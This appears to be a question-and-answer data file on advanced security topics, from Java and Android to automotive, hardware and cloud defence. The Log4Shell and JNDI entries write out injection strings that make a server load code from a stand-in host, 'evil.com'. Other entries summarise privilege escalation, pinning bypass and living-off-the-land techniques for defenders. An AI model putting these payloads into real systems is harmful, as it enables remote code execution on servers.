What are the security implications of running privileged containers (--privileged flag)?	Privileged containers have all Linux capabilities, access to all host devices (/dev), can load kernel modules, disable SELinux/AppArmor, and mount host filesystems. A container escape from a privileged container means immediate full host compromise. Never use --privileged; grant only specific capabilities needed.
How does IMA/EVM combine with secure boot to create a measured and verified boot chain?	Secure boot verifies bootloader and kernel signatures (chain of trust from hardware root). IMA measures (hashes) every executed binary and loaded module after kernel boot, storing measurements in TPM PCRs. EVM protects file metadata. Together they ensure: hardware → bootloader → kernel → every binary is verified, creating an unbroken trust chain.

# === Java Security (Advanced) ===

What is ysoserial and how is it used?	A tool that generates serialized Java objects containing gadget chains for various libraries (Commons Collections, Spring, etc.). These payloads, when deserialized by a vulnerable server, execute arbitrary commands.
How did Log4Shell (CVE-2021-44228) work?	Log4j 2.x evaluated JNDI lookup strings in log messages (`${jndi:ldap://evil.com/a}`). An attacker could trigger remote class loading from a malicious LDAP/RMI server, achieving remote code execution on the logging server.
What is JNDI injection?	Attacking `InitialContext.lookup()` with a user-controlled JNDI path. The attacker provides a URL (e.g., `ldap://evil.com/obj`) that causes the JVM to fetch and instantiate a remote object, leading to RCE.
How can Java agents (`-javaagent`) be used for attacks?	A Java agent can instrument any class using `java.lang.instrument`. A malicious agent injected via JVM startup or attach API can modify bytecode, intercept methods, read fields, install backdoors — with full access to the JVM.
What are bytecode manipulation attacks?	Using libraries (ASM, Javassist, Byte Buddy) to modify class bytecode at load time. An attacker with classloader or agent access can inject malicious code into any class: add backdoors, exfiltrate data, or disable security checks.
What is Expression Language (EL) injection?	Injecting expressions (`${...}` or `#{...}`) into JSP/JSF/Spring templates that get evaluated by the EL engine. Attackers can call arbitrary methods, access runtime objects, and execute OS commands. OGNL injection in Struts2 led to CVE-2017-5638 (Equifax breach).
What is a GC resurrection attack?	In `finalize()`, an object can re-register itself (e.g., store `this` in a static field), preventing garbage collection. If a security-sensitive object is "finalized" but then resurrected, security checks performed during construction may be bypassed.
What security risks does `sun.misc.Unsafe` pose?	`Unsafe` allows direct memory access, bypassing all JVM safety: write arbitrary memory, instantiate objects without calling constructors, perform CAS operations. Effectively defeats Java's type safety and access control. Restricted via module system but accessible via `--add-opens`.
Why are JMX ports a security risk?	JMX (Java Management Extensions) provides remote management of JVMs. If a JMX port is open without authentication or SSL, an attacker can invoke MBeans, deploy code, modify JVM settings, and achieve RCE.
What is a padding oracle attack in Java?	When decrypting AES-CBC, a server that reveals whether padding is valid (via different error messages or timing) allows an attacker to decrypt ciphertext byte-by-byte without the key. Use AES-GCM (authenticated encryption) instead.
How does Java Flight Recorder (JFR) help with security?	JFR continuously records low-overhead events: class loading, thread activity, memory allocation, exceptions, I/O. Security teams can analyze recordings to detect anomalous class loading, suspicious method invocations, or resource abuse.
What lesson does Log4Shell teach about treating user-controlled data as inert throughout the stack?	Log4j evaluated JNDI lookup strings embedded in log messages — data flowed from user input into an infrastructure API (JNDI) that executed it as code. The lesson: user-controlled data must be treated as inert at every layer, including logging. Never pass unvalidated data to evaluation APIs (JNDI, EL, scripting engines, template renderers).
What defenses collectively reduce the risk of Java deserialization gadget chain attacks?	(1) `ObjectInputFilter` (JEP 290) allowlist restricting deserializable classes, (2) avoid deserializing untrusted data entirely, (3) replace Java serialization with JSON/protobuf for data exchange, (4) keep dependencies updated to remove known gadget libraries, (5) deploy network-level controls to restrict which services expose deserialization endpoints.
What security risks do JMX remote management ports introduce and how are they mitigated?	An open JMX port without authentication allows any network attacker to: invoke MBeans, deploy code via `MLet`, read memory, and change JVM settings — achieving RCE. Mitigate: require authentication (`com.sun.jmx.remote.authenticate=true`), enforce TLS, bind only to localhost or use SSH tunneling, or replace with local agent-based management (JFR, async-profiler).
What is the ysoserial payload generation process and how does it guide defensive strategy?	ysoserial generates serialized objects using known gadget chains from common libraries (Commons Collections, Spring, etc.). Each payload targets a different library. Defensive strategy: (1) identify which gadget libraries are on your classpath, (2) remove or update them, (3) layer ObjectInputFilter allowlists, (4) eliminate deserialization of untrusted data entirely.
What was the JNDI injection vector in Log4Shell and why was it so impactful?	Log4j evaluated ${jndi:ldap://...} lookup strings in log messages. Because logging is pervasive (user-agent headers, form inputs, custom fields are all logged), any user-controlled data reaching a log statement became an RCE vector. Impact: virtually every Java application logs something, making the attack surface enormous.
How does the Java module system (JPMS) restrict access compared to classpath-only deployment?	With JPMS, only explicitly exported packages are accessible to other modules. Internal packages are strongly encapsulated — reflection access requires explicit --add-opens flags. On the classpath, everything is accessible and reflection can bypass any access control. JPMS significantly reduces the attack surface of library internals.
What is a padding oracle attack and why does AES-GCM eliminate it?	In AES-CBC, the server may reveal valid vs. invalid padding through error messages or timing. The attacker uses this oracle to decrypt ciphertext block by block without the key. AES-GCM uses counter mode (no padding) and authenticated encryption — any modification is detected by the authentication tag, preventing the oracle entirely.
What is the security risk of Java's attach API and how can it be restricted?	The Attach API allows any process running as the same user to dynamically load agents into a running JVM — enabling code injection, debugging, and full memory access. Restrict with: -XX:+DisableAttachMechanism, running the JVM as a dedicated user, and OS-level controls (prevent ptrace via Yama).
How does Java Flight Recorder (JFR) detect anomalous class loading for security monitoring?	JFR records ClassLoad events with timestamps, class names, defining class loaders, and source locations. Security teams look for: classes loaded from unexpected locations (network, temp dirs), unusual class loaders, classes not in the application's SBOM, or loading patterns inconsistent with normal application behavior — indicators of code injection or gadget chain exploitation.

# === Android Security (Advanced) ===

How does Frida work for Android dynamic analysis?	Frida injects a JavaScript engine into the target process via ptrace or a Frida gadget. Analysts can hook Java methods (`Java.perform()`), native functions, bypass certificate pinning, and inspect runtime data.
How do you reverse engineer an Android APK?	`apktool d app.apk` (decode resources/Smali), `jadx` (decompile DEX to Java), `dex2jar` + JD-GUI (alternative decompilation). Analyze Smali for obfuscated logic, check AndroidManifest for exported components, find hardcoded secrets.
What is Android SELinux and how does it protect apps?	Android runs SELinux in enforcing mode. Each app, system service, and process has a security context (domain). Policies restrict which domains can access which files, sockets, and services — even root is constrained by policy.
What is Android Verified Boot (AVB)?	AVB verifies the integrity of firmware, kernel, and system partition using dm-verity with a hash tree. The chain of trust starts from hardware root of trust → bootloader → kernel → system. Tampering causes boot failure or a warning.
How do Binder vulnerabilities lead to privilege escalation?	Binder is Android's IPC mechanism. Bugs in the kernel Binder driver (e.g., race conditions, reference counting errors) or in system services' Binder interfaces can be exploited to execute code as a privileged process (system_server, root).
What is an Android exploit chain?	A multi-stage attack: (1) initial access (e.g., browser RCE via JavaScript engine bug), (2) sandbox escape, (3) kernel exploit for privilege escalation. Each stage uses a separate vulnerability. Used by commercial spyware (Pegasus).
How does hardware-backed key attestation work on Android?	The Android Keystore generates a key inside the TEE/SE and produces an attestation certificate chain signed by a device-specific key rooted in Google's certificate. The relying party can verify the key was generated in genuine hardware.
What is Magisk and how does it hide root?	Magisk modifies the boot image (not the system partition) to gain root. Zygisk injects into app processes. MagiskHide/DenyList removes traces of root from specific apps. It can bypass SafetyNet/Play Integrity checks (though Google continuously hardens detection).
What are accessibility service abuse vectors on Android?	A malicious accessibility service can: overlay windows (phishing), read screen content (credential stealing), inject taps/gestures (unauthorized actions), observe input (keylogging), and interact with any app — all while appearing as a legitimate accessibility tool.
What is a GPU side-channel attack on mobile?	Techniques like GPU cache timing or shared GPU memory between apps can leak rendered content (keyboard positions, screen content) across process boundaries. Emerging research area with limited practical exploitation so far.
How does Frida bypass certificate pinning and what countermeasures are more resilient to it?	Frida hooks Java SSL verification methods (`TrustManager.checkServerTrusted()`, `OkHttp CertificatePinner.check()`) and replaces them with no-ops at runtime. More resilient countermeasures: implement pinning in native code (harder to hook from Java layer), verify Frida's presence (check `/proc/self/maps` for frida-agent, unusual file descriptors), combine with root/integrity detection.
How does Android Verified Boot prevent rollback to a previously-signed but vulnerable firmware version?	AVB stores a rollback index in write-once protected memory (RPMB or eMMC). Each firmware image embeds its rollback index. The bootloader rejects any image with an index lower than the stored value — preventing downgrade attacks even if the attacker possesses a validly-signed older image with known vulnerabilities.
What makes an Android exploit chain multi-stage and what does patching one stage do?	Stage 1 (initial access): browser/WebView JS engine bug → renderer RCE. Stage 2 (sandbox escape): exploit IPC (Binder), shared memory, or a driver to escape the app process. Stage 3 (privilege escalation): kernel exploit for root/system. Each stage is a separate vulnerability. Patching any one stage forces the attacker to find a replacement, significantly raising the cost of the full chain.

# === Automotive Security (Advanced) ===

What is CAN-FD and what are its security implications?	CAN-FD (Flexible Data-rate) supports larger payloads (64 bytes vs 8) and faster transfer rates. Larger payloads increase the data an attacker can inject in a single frame. The same lack of authentication applies.
How does V2X PKI (SCMS) work?	The Security Credential Management System issues pseudonymous short-lived certificates to vehicles for signing V2X messages. Certificates are rotated frequently for privacy. SCMS also supports misbehavior detection and certificate revocation.
How can LiDAR and cameras be spoofed in autonomous vehicles?	LiDAR: projecting laser patterns to create phantom objects or hide real ones. Cameras: adversarial patches (stickers that fool classifiers), infrared LED blinding. Sensor fusion helps but isn't immune to coordinated multi-sensor attacks.
What is a remote exploitation chain in an automotive context?	Example (2015 Jeep Cherokee): exploit cellular modem → pivot to head unit OS → reach CAN bus through a gateway weakness → send commands to steering/brakes. Demonstrates how remote entry points can reach safety-critical systems.
What is the difference between AUTOSAR Classic and Adaptive from a security perspective?	Classic: runs on bare-metal MCUs with deterministic execution, uses SecOC for CAN authentication. Adaptive: runs on POSIX/Linux-based platforms with dynamic service discovery (ara::com), requires IAM, TLS, and process isolation — broader attack surface.
What is ISO 21434 TARA in detail?	TARA involves: (1) asset identification (data, functions), (2) threat scenarios (attacker goals, capabilities), (3) attack path analysis, (4) attack feasibility assessment (elapsed time, expertise, equipment, knowledge), (5) impact rating, (6) risk determination, (7) cybersecurity goals and claims.
What is SOTIF (ISO 21448) and how does it relate to security?	Safety of the Intended Functionality addresses hazards from performance limitations or misuse — not hardware faults (ISO 26262) or cyber attacks (ISO 21434). But adversarial inputs (sensor spoofing) blur the SOTIF/security boundary. Both standards must be considered together for ADAS/AV.
How does ISO 15118 Plug & Charge work and what are its security concerns?	ISO 15118 enables automated EV charging authentication via TLS between the vehicle and charger. The EV presents a contract certificate. Risks: compromised charger firmware, MitM between EV and back-end, PnC root CA compromise, lack of revocation infrastructure.
What tools are used in automotive penetration testing?	CANalyze, CANtact (CAN hardware), SavvyCAN (CAN analysis software), Vector CANoe/CANalyzer (professional tools), UDS diagnostic scanners, Scapy (CAN frame crafting in Python), binwalk/Ghidra (firmware analysis), Software Defined Radio (key fob attacks).
What does post-quantum readiness mean for automotive?	Vehicles have 15+ year lifecycles but crypto algorithms may break sooner. Manufacturers must plan OTA-capable crypto migration: algorithm-agile firmware, updateable key material, hybrid schemes. ISO 21434 requires considering evolving threat landscapes.
How does AUTOSAR SecOC authenticate CAN messages and what are its inherent limitations?	SecOC appends a truncated MAC (computed with a symmetric key shared between sender and receiver ECU) to each CAN message, providing message authenticity and integrity. Limitations: MACs are heavily truncated (4–8 bytes) due to CAN's 8-byte payload constraint — reducing security margin against brute-force. Key management across 100+ ECUs from multiple suppliers is operationally complex. No confidentiality.
How does a RollJam attack defeat rolling codes and what countermeasures exist?	The attacker simultaneously jams the car receiver and records the transmitted code. When the victim presses again (thinking it failed), the attacker records the second code and releases the first (car unlocks). The attacker holds one valid unused code for later. Countermeasures: time-limited codes (expire after a few seconds), UWB-based distance bounding (car won't unlock if fob is not physically near), challenge-response protocols instead of one-way rolling codes.
What does ISO/SAE 21434 require beyond the design phase of a vehicle component?	ISO 21434 mandates: (1) threat analysis and security requirements during design (TARA), (2) security testing during development, (3) security processes in production/supply chain, (4) continuous monitoring and incident response during operation, (5) secure decommissioning (data deletion). It requires a Cybersecurity Management System (CSMS) spanning the full vehicle lifecycle, unlike traditional safety standards focused only on development.
What is the 2015 Jeep Cherokee hack and what did it demonstrate about automotive attack surfaces?	Researchers (Miller & Valasek) exploited the Uconnect cellular modem to gain shell access on the head unit, then pivoted through a gateway weakness to reach the CAN bus, sending commands to steering and brakes at highway speed. It demonstrated that internet-connected components with insufficient isolation can provide a remote path to safety-critical vehicle systems.
What is V2X (Vehicle-to-Everything) communication and what are its security challenges?	V2X enables vehicles to communicate with other vehicles (V2V), infrastructure (V2I), pedestrians (V2P), and networks (V2N) for safety and efficiency. Security challenges: message authenticity (preventing spoofed warnings), privacy (tracking vehicles via certificates), availability (jamming), and scalability of the PKI infrastructure (SCMS) for millions of vehicles.
How does Automotive Ethernet differ from office/datacenter Ethernet from a security perspective?	Automotive Ethernet uses unshielded twisted pair (100BASE-T1) for weight/cost, has strict latency requirements, and runs in physically accessible vehicles. Unlike datacenter Ethernet, it often lacks mature switch-level ACLs, network monitoring is limited, and physical access to cables is feasible. MACsec and in-vehicle firewalls compensate for the different threat model.
What is the security relationship between ISO 26262 (functional safety) and ISO 21434 (cybersecurity)?	ISO 26262 addresses safety from random hardware faults and systematic software errors. ISO 21434 addresses intentional attacks. A cybersecurity breach can cause a safety violation (compromised brakes), so both standards must be applied together. ISO 21434 TARA must consider safety impact levels from ISO 26262, and safety mechanisms must be resilient against cyber attacks.
What is a supply chain attack in the automotive context?	A compromised third-party ECU supplier can introduce backdoored firmware, tampered hardware, or vulnerable software into vehicles during manufacturing. With 50-100+ ECUs from dozens of suppliers, the attack surface is massive. ISO 21434 requires cybersecurity management of the supply chain, including supplier assessments and component verification.

# === Offensive Security Concepts (for Defenders) ===

What is attack surface mapping?	Systematically identifying all entry points (network services, APIs, web apps, physical interfaces) and understanding the exposure of each. Includes subdomain enumeration, port scanning, technology fingerprinting, and API discovery.
What is the difference between a buffer overflow exploit and ROP?	Buffer overflow injects and executes attacker-provided shellcode (blocked by DEP/NX). ROP reuses existing code fragments (gadgets) in memory — works even with DEP because no new code is injected.
What are common Linux privilege escalation techniques?	SUID binary abuse, kernel exploits (dirty pipe, dirty COW), misconfigured sudo rules, writable cron jobs or systemd services, capabilities misuse, writable PATH directories, unquoted service paths, Docker socket access.
What is lateral movement in post-exploitation?	After compromising one system, moving to others in the network: credential theft (Mimikatz, key files), network pivoting, exploiting trust relationships, abusing shared credentials, using remote management tools.
What is the MITRE ATT&CK framework?	A knowledge base of adversary tactics (why) and techniques (how) based on real-world observations. Covers Initial Access through Exfiltration. Used for threat modeling, detection engineering, red/blue team exercises, and gap analysis.
What is coverage-guided fuzzing?	Fuzzing that uses code coverage feedback (branch/edge tracking) to evolve test inputs toward exploring new code paths. Finds crashes, memory bugs, and assertion failures. Tools: AFL++, libFuzzer, Honggfuzz.
What is difference between red, blue, and purple team?	Red team simulates attackers (offensive). Blue team defends and detects (defensive). Purple team integrates both — red shares TTPs with blue in real-time to improve detection and response. Most effective when collaborative.
What is the difference between coverage-guided fuzzing and generation-based fuzzing?	Coverage-guided fuzzing (AFL++, libFuzzer) uses code coverage instrumentation to mutate inputs toward unexplored branches — very effective for complex parsers and state machines. Generation-based fuzzing creates inputs from a grammar or protocol specification — produces structurally valid inputs, better for protocols with strict formats where random mutations never produce valid messages.
What is Kerberoasting and how is it prevented?	Any domain-authenticated user can request a Kerberos TGS (service ticket) for any registered SPN. The ticket is encrypted with the service account's NTLM hash. Attackers crack offline at GPU speed. Prevent with: service accounts using long random passwords (25+ chars), Group Managed Service Accounts (gMSAs) with auto-rotating passwords, monitoring for unusual TGS-REQ patterns (many service tickets from one account).
What is the difference between vulnerability scanning and exploitation in offensive security?	Vulnerability scanning identifies known weaknesses by checking versions, configurations, and signatures — it reports potential issues with varying confidence. Exploitation proves a vulnerability is real by actually leveraging it to demonstrate impact (data access, code execution). Scanning finds; exploitation validates.
What is privilege escalation and what are the two types?	Gaining higher privileges than initially granted. Horizontal: accessing another user's resources at the same privilege level (user A reads user B's data). Vertical: elevating from lower to higher privilege (regular user to admin/root). Both are critical — horizontal exposes data, vertical enables full system control.
How does the MITRE ATT&CK framework help blue teams improve detection?	ATT&CK maps specific adversary techniques to detection data sources (process creation logs, network traffic, file monitoring). Blue teams can: map their current detection coverage to the ATT&CK matrix, identify gaps, and prioritize detection engineering for uncovered techniques. It turns threat intelligence into actionable detection rules.
What is the difference between a reverse shell and a bind shell?	Bind shell: the attacker's payload opens a port on the target that listens for incoming connections. Reverse shell: the payload connects back to the attacker's machine. Reverse shells are more common because they bypass outbound-only firewalls — the target initiates the connection outward.
What is Living Off the Land (LOLBins) in post-exploitation?	Using legitimate, pre-installed system tools (PowerShell, certutil, wmic, curl, python) for malicious purposes: downloading payloads, exfiltrating data, executing code. LOLBins evade detection because the tools themselves are trusted and their usage blends with normal system activity.
What is the purpose of a Command and Control (C2) framework?	C2 frameworks (Cobalt Strike, Sliver, Metasploit) provide infrastructure for managing compromised systems: issuing commands, collecting data, pivoting through networks, and maintaining persistence. They communicate via covert channels (HTTPS, DNS, legitimate cloud services) to avoid detection.

# === Secure Architecture & Design ===

What are the core principles of Zero Trust Architecture?	Never trust, always verify. Assume breach. Verify every request based on identity, device posture, network location, and data sensitivity. Use least-privilege access, micro-segmentation, and continuous authentication.
How does a service mesh provide security?	Service meshes (Istio, Linkerd) inject sidecar proxies that enforce mTLS between services (zero-trust), manage certificate rotation, implement authorization policies, and provide encrypted service-to-service communication without application changes.
What is threat modeling using PASTA?	Process for Attack Simulation and Threat Analysis — a 7-stage risk-centric methodology: (1) define objectives, (2) define technical scope, (3) decompose application, (4) analyze threats, (5) identify vulnerabilities, (6) enumerate attacks, (7) analyze risk/impact.
What is a DLP (Data Loss Prevention) strategy?	Policies and tools that detect and prevent sensitive data (PII, credentials, intellectual property) from leaving the organization via email, uploads, removable media, or network channels. Uses pattern matching, classification labels, and endpoint agents.
How does HashiCorp Vault manage secrets?	Vault stores secrets encrypted at rest, provides dynamic short-lived credentials (database, AWS IAM), supports secret rotation, enforces ACLs, offers transit encryption (encrypt/decrypt as a service), and maintains a full audit log.
What is SOC 2 and what technical controls does it require?	A compliance framework for service organizations covering Trust Service Criteria: Security, Availability, Processing Integrity, Confidentiality, Privacy. Technical controls include encryption, access management, monitoring, incident response, change management.
What is the fundamental difference between Zero Trust Architecture and perimeter-based security?	Perimeter security assumes everything inside the network boundary is trusted (castle-and-moat). Zero Trust assumes no implicit trust based on network location — every request must be authenticated, authorized, and continuously validated regardless of whether it originates inside or outside the network perimeter.
How does HashiCorp Vault's dynamic secrets feature differ from static secret storage?	Dynamic secrets are generated on-demand, unique per client request, and short-lived (TTL-based). When the TTL expires, Vault revokes the credentials automatically. This means no shared credentials, minimal exposure window, and automatic cleanup — unlike static secrets that are long-lived, shared, and often never rotated until a breach occurs.
How does micro-segmentation differ from traditional network segmentation?	Traditional segmentation uses VLANs and firewalls to isolate network zones (DMZ, internal, management). Micro-segmentation applies granular policies at the workload/pod level — each service can only communicate with its explicitly authorized peers. Service meshes enforce micro-segmentation via sidecar proxies with mTLS and authorization policies.
What is the difference between PASTA and STRIDE as threat modeling methodologies?	STRIDE is threat-categorization focused — it systematically identifies threat types per system component. PASTA is risk-centric and business-aligned — it starts with business objectives, analyzes technical scope, enumerates realistic attack scenarios, and prioritizes by business impact. STRIDE is simpler; PASTA provides more business context for risk decisions.
What is a data classification scheme and why is it essential for DLP?	A classification scheme labels data by sensitivity level (Public, Internal, Confidential, Restricted). DLP rules are tied to classifications: Restricted data can't leave the network without encryption, Confidential requires approval for external sharing. Without classification, DLP policies can't distinguish sensitive data from routine content.
What are the three pillars of observability and how do they support security monitoring?	Logs (discrete events: auth failures, errors), Metrics (quantitative measurements: request rates, latency, error rates), Traces (request flows across services). Together they enable detecting anomalies (unusual error spikes), investigating incidents (tracing a malicious request's path), and measuring security posture (authentication failure rates).
What is the difference between SOC 2 Type I and Type II certifications?	Type I evaluates the design of controls at a specific point in time — are the right controls in place? Type II evaluates the operating effectiveness of controls over a period (typically 6-12 months) — do the controls actually work? Type II is more rigorous and more valued by customers.
What is defense in depth for a cloud-native application?	Multiple layers: network (VPC, security groups, WAF), identity (OIDC, mTLS, least-privilege IAM), application (input validation, parameterized queries, CSP), data (encryption at rest, field-level encryption, key rotation), runtime (container scanning, admission controllers, runtime monitoring), and operational (SIEM, incident response, chaos engineering).

# === Advanced Embedded & Hardware Security ===

How do voltage glitching attacks work?	Brief, precisely timed drops in supply voltage cause the processor to skip/misexecute instructions. Attackers target security checks (signature verification, password comparison) to bypass them. Requires physical access and precise timing equipment.
What is Differential Power Analysis (DPA)?	A side-channel attack that statistically analyzes variations in a device's power consumption during cryptographic operations to extract secret keys. Countermeasures: masking (randomized intermediate values), constant-power implementations.
How is firmware reverse engineered from embedded devices?	Extract firmware via JTAG/SWD debug, SPI flash dump, UART shell, or OTA update capture. Analyze with binwalk (find embedded filesystems), Ghidra/IDA Pro (disassemble ARM/MIPS code), strings, and entropy analysis.
What is ARM TrustZone and how does it provide a TEE?	TrustZone divides the processor into Secure and Normal worlds via hardware isolation. The secure world runs a Trusted OS (OP-TEE, Trusty) and trusted applications. The normal world (Linux/Android) can request secure services via SMC calls but can't access secure memory.
What are Physical Unclonable Functions (PUFs)?	Silicon-level random variations in manufacturing that create unique, device-specific response patterns. Used as hardware fingerprints for device authentication and key generation. Can't be cloned because they depend on nanoscale manufacturing randomness.
What is tamper detection and response?	Physical security mechanisms that detect unauthorized access (opening enclosures, probing circuits) and respond by zeroizing keys or disabling the device. Used in payment terminals, HSMs, and military equipment.
What is ASLR on embedded devices?	A best-effort implementation of address randomization on embedded platforms where entropy may be limited by constrained hardware. Often combined with MPU, stack canaries, and W^X to provide defense in depth.
How do IEC 62443 and FDA guidance apply to medical device security?	IEC 62443 defines security levels for industrial automation (including medical devices). FDA premarket guidance requires threat modeling, cybersecurity testing, software bill of materials (SBOM), and vulnerability management plans for connected medical devices.
How does DPA (Differential Power Analysis) extract secret keys and what countermeasures resist it?	DPA statistically correlates power consumption measurements across many cryptographic operations with intermediate values computed using key hypotheses. The correct key guess produces the highest correlation. Countermeasures: masking (XOR intermediate values with random shares so power consumption is independent of actual value), power-line filtering and decoupling, noise injection, and constant-power algorithm implementations.
What is ARM TrustZone's threat model, and what attacks does it NOT protect against?	TrustZone provides hardware isolation between Secure and Normal worlds, protecting secure-world memory from normal-world software — including a compromised OS. It does NOT protect against: voltage/clock glitching (can flip TrustZone ACE bits), DPA on secure-world crypto operations, bugs in the Trusted OS itself, or vulnerabilities in the Secure/Normal world interface (SMC call handlers).
How are Physical Unclonable Functions (PUFs) used for device authentication?	During enrollment, the manufacturer sends challenges to each PUF and records its unique responses (based on uncontrollable manufacturing variation). During authentication, the verifier sends challenges — only the genuine chip with those specific physical characteristics produces the correct responses. PUFs cannot be cloned because the response depends on nanoscale manufacturing randomness, enabling hardware-rooted identity without key injection.
What is electromagnetic fault injection (EMFI) and how does it compare to voltage glitching?	EMFI uses localized electromagnetic pulses to induce faults in specific chip regions without physical contact. Voltage glitching requires probing the power rail. EMFI is more precise (can target specific modules) and harder to detect. Both skip instructions or corrupt computations to bypass security checks.
What is the difference between SPA (Simple Power Analysis) and DPA (Differential Power Analysis)?	SPA examines a single power trace to directly observe key-dependent operations (e.g., square vs. multiply in RSA). DPA uses statistical analysis across many traces to correlate power consumption with intermediate values, extracting keys even with noise. DPA is more powerful but requires many measurements; SPA is faster but works only on unprotected implementations.
What is a secure element's role in payment systems (EMV)?	The SE stores payment credentials and performs transaction cryptography inside tamper-resistant hardware. During a transaction, it generates a unique cryptogram that proves the card is genuine without revealing the stored key. Physical tampering triggers key zeroization. This is why chip cards are much harder to clone than magnetic stripe.
What is firmware attestation and how does it differ from secure boot?	Secure boot verifies firmware at boot time and halts if invalid. Attestation enables a remote party to verify the device's firmware state at any time — the device provides a signed measurement (hash of its firmware) for remote verification. Attestation is continuous and remote; secure boot is local and one-time.
How do side-channel countermeasures like masking work conceptually?	Masking splits every secret intermediate value into multiple random shares (e.g., value XOR random_mask). Operations are performed on shares independently. An attacker observing power consumption of one share sees only random data. Revealing the secret requires correlating all shares simultaneously, exponentially increasing the number of traces needed.
What are JTAG/SWD debug ports and why are they a security concern on production devices?	JTAG and SWD provide full debug access: reading/writing all memory, setting breakpoints, accessing CPU registers. On production devices, an attacker with physical access can extract firmware, encryption keys, and bypass all software security. Production devices should disable or lock debug ports using fuse-based permanent disabling.

# === Advanced Infrastructure & Cloud Security ===

What is Falco and how does it detect runtime threats?	Falco monitors Linux syscalls (via kernel module or eBPF) and detects suspicious activity: shell spawning in containers, sensitive file reads, unexpected network connections. Rules are written in a custom DSL.
What is Sigstore and how does it secure the supply chain?	Sigstore provides free, automated code/container signing using short-lived certificates (no long-term key management). Components: Fulcio (CA), Rekor (transparency log), Cosign (container signing). Provides non-repudiation via public audit logs.
What is the difference between Falco's kernel module and eBPF-based detection?	The kernel module provides deepest visibility but loads arbitrary kernel code (risk of crashes, attack surface). The eBPF probe is verified by the kernel before loading (safe, no crashes), portable across kernel versions with CO-RE, but requires kernel 5.8+ for full features. eBPF is preferred for production; kernel modules for legacy kernels.
What is a Kubernetes admission controller and how does it enforce security policies?	Admission controllers intercept API requests after authentication/authorization but before persistence. They can validate (reject non-compliant pods) or mutate (inject sidecars, add labels). Security-focused controllers (OPA Gatekeeper, Kyverno) enforce policies like: no privileged containers, required resource limits, mandatory labels, and approved image registries.
What is SLSA (Supply chain Levels for Software Artifacts) and what does each level provide?	SLSA defines 4 levels of supply chain security: Level 1 (build provenance exists), Level 2 (hosted build service, version control), Level 3 (hardened build platform, source integrity), Level 4 (hermetic, reproducible builds, two-person review). Higher levels provide stronger guarantees against tampering at each stage of the build pipeline.
What is the difference between CSPM (Cloud Security Posture Management) and CWPP (Cloud Workload Protection)?	CSPM monitors cloud infrastructure configuration for misconfigurations: open S3 buckets, overly permissive IAM policies, unencrypted storage. CWPP protects running workloads: runtime vulnerability scanning, behavioral monitoring, file integrity checking, network micro-segmentation within VMs/containers. CSPM finds config issues; CWPP detects runtime threats.
What is GitOps and how does it improve infrastructure security?	GitOps uses Git as the single source of truth for infrastructure state. All changes go through pull requests (peer review, audit trail), and a reconciliation controller (ArgoCD, Flux) ensures the actual state matches the declared state. Security benefits: every change is reviewed, auditable, reversible, and no direct access to production clusters is needed.
What are OPA/Gatekeeper admission controllers?	Open Policy Agent (OPA) evaluates policies written in Rego language. In Kubernetes, Gatekeeper acts as a validating admission webhook — rejecting pod/resource creation that violates policies (e.g., running as root, using latest tag).
What is SLSA (Supply-chain Levels for Software Artifacts)?	A framework with maturity levels (L0–L4) for supply chain security. Covers: source integrity (verified source), build integrity (hermetic, reproducible builds), provenance (signed build metadata), and artifact distribution.
What is CSPM (Cloud Security Posture Management)?	Tools that continuously scan cloud configurations for misconfigurations and compliance violations: public S3 buckets, open security groups, unencrypted databases, over-privileged IAM roles. Examples: AWS Config, Prisma Cloud, Wiz.
What is eBPF used for in security monitoring?	eBPF attaches programs to kernel events to observe: process execution, file access, network connections, syscalls — all without kernel modules. Enables deep observability tools (Tetragon, Falco, Cilium) with minimal performance impact.
How do you perform memory forensics?	Use tools like Volatility Framework to analyze memory dumps: list processes, extract network connections, find injected code, recover encryption keys, detect rootkits. Memory dumps can be acquired from running systems, VM snapshots, or crash dumps.
What should an incident response plan include?	Preparation (tools, roles), Detection & Analysis (alerts, triage), Containment (isolate affected systems), Eradication (remove threat), Recovery (restore services), Lessons Learned. Maintain chain of custody for forensic evidence.
How does Sigstore's keyless signing model eliminate long-term key management risk?	The developer authenticates with an OIDC identity (GitHub Actions, Google, etc.). Fulcio issues a short-lived certificate (valid ~10 minutes) binding the ephemeral signing key to that identity. The signature and certificate are stored in Rekor (immutable transparency log). No private key is kept long-term — a compromised signing environment leaves only a narrow time window of exposure, and all signatures are publicly auditable.
What supply chain attacks does SLSA Level 4 prevent that lower levels do not?	SLSA L4 requires hermetic, reproducible builds with two-party review. This prevents: compromised developer workstations injecting code during local builds (already addressed at L3 with a hardened build service), and build-time tampering — because reproducibility allows independent parties to verify the artifact exactly matches the source. L4 is the strongest guarantee that what ships is exactly what was reviewed.
How does eBPF enable runtime threat detection without kernel modules?	eBPF programs are verified by the kernel's verifier before loading (no unbounded loops, verified memory access, restricted helpers) and run in kernel context at hook points. Security tools like Tetragon and Falco use eBPF to observe syscalls, process execution, file access, and network events at near-native speed — without the kernel module's risks (can crash the kernel, hard to unload, full kernel code execution).
What is the difference between OPA/Gatekeeper and Kyverno for Kubernetes policy enforcement?	OPA/Gatekeeper uses the Rego language (declarative, functional) — powerful but has a steep learning curve. Kyverno uses Kubernetes-native YAML for policies — simpler to write and understand for K8s operators. Both act as admission webhooks. Choose based on team expertise and policy complexity requirements.
What is volatile vs. non-volatile evidence in digital forensics?	Volatile evidence (RAM, running processes, network connections, CPU registers) is lost when the system is powered off — must be collected first. Non-volatile (disk, logs, configuration files) persists across reboots. Forensic procedures follow the order of volatility: collect the most ephemeral evidence first.
What is the difference between incident response and disaster recovery?	Incident response handles security events: detect, contain, eradicate the threat, recover, and learn. Disaster recovery restores business operations after major disruptions (data center failure, natural disaster, ransomware). Incident response is security-focused; disaster recovery is continuity-focused. A major security incident may trigger disaster recovery.
